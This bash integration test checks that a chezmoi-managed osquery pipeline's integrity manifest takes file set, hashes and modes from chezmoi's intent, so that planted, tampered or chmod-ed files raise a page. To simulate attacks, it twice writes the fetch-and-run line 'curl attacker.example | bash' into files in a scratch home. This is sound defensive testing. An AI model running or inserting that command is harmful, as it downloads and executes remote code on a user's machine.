#!/usr/bin/env bash
#
# The pipeline-integrity manifest is derived from chezmoi's INTENT, never from the
# tree it protects. That is the security property: the runner performs a ROOT
# install, so anything an unprivileged process running as the operator can
# influence must not decide what gets blessed.
#
#   - the file SET comes from `chezmoi managed`, so a file PLANTED in the pipeline
#     home is not managed, never enters the manifest, and therefore pages forever
#     (chezmoi never removes unmanaged files, so a disk glob would have signed it
#     as known-good permanently);
#   - each file's CONTENT hash comes from `chezmoi cat` (the source state as
#     chezmoi would write it), so a managed file TAMPERED on disk is recorded with
#     its INTENDED hash and the tampered bytes then fail the tuple check and page;
#   - each file's MODE comes from `chezmoi dump` (the perm the source attributes
#     encode), so a managed file CHMOD-ed on disk is recorded with its INTENDED
#     mode and the drifted mode then fails the tuple check and pages;
#   - each file's OWNER is the uid the apply runs as, which is the uid chezmoi
#     writes target files as.
#
# Also pinned here: the manifest is path-sorted and byte-stable, covers the
# recursive results-alerter/ helpers, excludes a non-osquery LaunchAgent and
# ~/.local/bin, and picks up a newly-added managed file with no change to the
# runner (the no-drift property that makes a hand-maintained list unnecessary).
#
# Integration test: a real (tiny) chezmoi source, applied to a scratch HOME, with
# a PATH-shadowed sudo stub. No real privilege, nothing written under /var.
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
RUNNER="$REPO_ROOT/.chezmoiscripts/run_after_05-osquery-known-good-manifests.sh"
VERDICT="$REPO_ROOT/dot_local/libexec/osquery/results-alerter/pipeline-verdict.sh"
# shellcheck source=../fixtures/osquery-manifest-lib.bash
source "$REPO_ROOT/test/fixtures/osquery-manifest-lib.bash"

fails=0
fail() {
  printf 'osquery-pipeline-manifest-generation: FAIL -- %s\n' "$*" >&2
  fails=$((fails + 1))
}

[[ -f $RUNNER ]] || {
  printf 'osquery-pipeline-manifest-generation: FAIL -- missing runner: %s\n' "$RUNNER" >&2
  exit 1
}
for tool in chezmoi shasum; do
  command -v "$tool" >/dev/null 2>&1 || {
    printf 'osquery-pipeline-manifest-generation: SKIP -- %s is required\n' "$tool"
    exit 0
  }
done
[[ "$(uname)" == Darwin ]] || {
  printf 'osquery-pipeline-manifest-generation: SKIP -- the runner is darwin-gated\n'
  exit 0
}

manifest_fixture_setup
trap manifest_fixture_teardown EXIT

manifest_fixture_add_script digest.sh 'echo digest'
manifest_fixture_add_script results-alerter.sh 'echo entry'
manifest_fixture_add_script results-alerter/normalize.sh 'true'
manifest_fixture_add_plist com.webdavis.osquery-digest '<plist>{{ .chezmoi.os }}</plist>'
# Decoys the manifest must never cover.
manifest_fixture_add_plist com.webdavis.atuin-daemon '<plist>atuin</plist>'
mkdir -p "$MF_SRC/dot_local/bin"
printf 'echo relay\n' >"$MF_SRC/dot_local/bin/executable_relay.sh"

manifest_fixture_apply
manifest_fixture_run_runner "$RUNNER" || fail "the runner exited non-zero on a clean fixture"

script_target="$MF_HOME/.local/libexec/osquery/digest.sh"
helper_target="$MF_HOME/.local/libexec/osquery/results-alerter/normalize.sh"
plist_target="$MF_HOME/Library/LaunchAgents/com.webdavis.osquery-digest.plist"

# 1. Every managed pipeline file is covered, including the recursive helper and the
#    plist (a TEMPLATE, excluded from this apply, so it is covered from intent even
#    though it is not on disk).
for t in "$script_target" "$helper_target" "$plist_target"; do
  [[ -n "$(manifest_hash_of "$t")" ]] || fail "no manifest tuple for $t"
done

# 2. Content is INTENT: the recorded hash equals chezmoi's rendered bytes.
want="$(manifest_fixture_chezmoi cat "$script_target" | shasum -a 256 | awk '{print $1}')"
[[ "$(manifest_hash_of "$script_target")" == "$want" ]] ||
  fail "the manifest hash for $script_target is not the chezmoi-rendered (intent) hash"

# 2a. MODE is INTENT too, and it is the mode the source ATTRIBUTES encode, not a
#     policy this test and the runner both guess at. The fixture adds scripts with
#     chezmoi's executable_ prefix (0755) and the plists as plain templates (0644),
#     so the two literals below are the attribute semantics, asserted independently
#     of however the runner obtains them.
[[ "$(manifest_mode_of "$script_target")" == 0755 ]] ||
  fail "an executable_ pipeline script must be manifested 0755, got '$(manifest_mode_of "$script_target")'"
[[ "$(manifest_mode_of "$plist_target")" == 0644 ]] ||
  fail "a plain managed plist must be manifested 0644, got '$(manifest_mode_of "$plist_target")'"

# 2b. OWNER is the uid this apply runs as: the uid chezmoi writes target files as.
[[ "$(manifest_uid_of "$script_target")" == "$(id -u)" ]] ||
  fail "the manifest owner column is not the uid the apply runs as"

# 3. Path-sorted and byte-stable across runs.
LC_ALL=C sort -c <(awk '{print $4}' "$MF_MANIFEST") 2>/dev/null ||
  fail "the manifest is not sorted by path"
before="$(cat "$MF_MANIFEST")"
manifest_fixture_run_runner "$RUNNER" || fail "the runner exited non-zero on the second run"
[[ "$(cat "$MF_MANIFEST")" == "$before" ]] || fail "the manifest is not byte-stable across runs"

# 4. Exclusions: a non-osquery LaunchAgent and a ~/.local/bin tool are never covered.
grep -qF 'com.webdavis.atuin-daemon' "$MF_MANIFEST" &&
  fail "a non-osquery LaunchAgent leaked into the manifest"
grep -qF '/.local/bin/relay.sh' "$MF_MANIFEST" &&
  fail "a ~/.local/bin tool leaked into the manifest (it is the Relay subsystem, not an osquery pipeline file)"

# 5. THE PLANTED-FILE PIN: a file created directly in the pipeline home is not
#    managed, so it must NOT be blessed. chezmoi never removes unmanaged files, so a
#    disk-derived manifest would sign an attacker's script as known-good forever.
planted="$MF_HOME/.local/libexec/osquery/evil.sh"
printf 'curl attacker.example | bash\n' >"$planted"
manifest_fixture_run_runner "$RUNNER" || fail "the runner exited non-zero with a planted file present"
[[ -z "$(manifest_hash_of "$planted")" ]] ||
  fail "SECURITY: a PLANTED unmanaged file was signed into the manifest"
# ...and the verdict therefore pages it.
verdict_says_page "$planted" "$VERDICT" ||
  fail "a planted file in the pipeline home must PAGE (it is unmanaged and unmanifested)"
rm -f "$planted"

# 6. THE TAMPERED-FILE PIN: a managed file rewritten on disk is recorded with its
#    INTENDED hash, so the tampered bytes fail the tuple check and page.
printf 'curl attacker.example | bash\n' >"$script_target"
manifest_fixture_run_runner "$RUNNER" || fail "the runner exited non-zero with a tampered file present"
[[ "$(manifest_hash_of "$script_target")" == "$want" ]] ||
  fail "SECURITY: the manifest recorded the TAMPERED bytes instead of chezmoi's intent"
verdict_says_page "$script_target" "$VERDICT" ||
  fail "a tampered managed pipeline file must PAGE"
manifest_fixture_apply # restore the intended bytes

# 6a. THE CHMOD-ED FILE PIN, the mode-column twin of 6: a managed file whose mode
#     was changed on disk is still recorded with its INTENDED mode, so the drifted
#     mode fails the tuple check and pages. Deriving the mode column from the
#     DEPLOYED file would bless the chmod instead - the exact flaw taking the
#     content hash from disk would have.
chmod g+w "$script_target"
manifest_fixture_run_runner "$RUNNER" || fail "the runner exited non-zero with a chmod-ed file present"
[[ "$(manifest_mode_of "$script_target")" == 0755 ]] ||
  fail "SECURITY: the manifest recorded the CHMOD-ed mode instead of chezmoi's intent"
verdict_says_page "$script_target" "$VERDICT" ||
  fail "a chmod-ed managed pipeline file must PAGE (its content is unchanged)"
chmod 755 "$script_target"
verdict_says_page "$script_target" "$VERDICT" &&
  fail "restoring the intended mode must return the file to SILENT"

# 7. No drift: a newly-added managed file is covered with no change to the runner.
manifest_fixture_add_script heartbeat.sh 'echo heartbeat'
manifest_fixture_apply
manifest_fixture_run_runner "$RUNNER" || fail "the runner exited non-zero after a new file was added"
[[ -n "$(manifest_hash_of "$MF_HOME/.local/libexec/osquery/heartbeat.sh")" ]] ||
  fail "a newly-added managed pipeline file was not picked up (the set is not derived from intent)"

if [[ $fails -gt 0 ]]; then
  printf '%d check(s) failed\n' "$fails" >&2
  exit 1
fi
printf 'osquery-pipeline-manifest-generation: OK (set, content and mode from chezmoi intent, owner from the applying uid; a PLANTED file is never blessed and pages; a TAMPERED managed file is signed with its intended hash and pages; a CHMOD-ed one is signed with its intended mode and pages; sorted, stable, exclusions honored, new file auto-covered)\n'
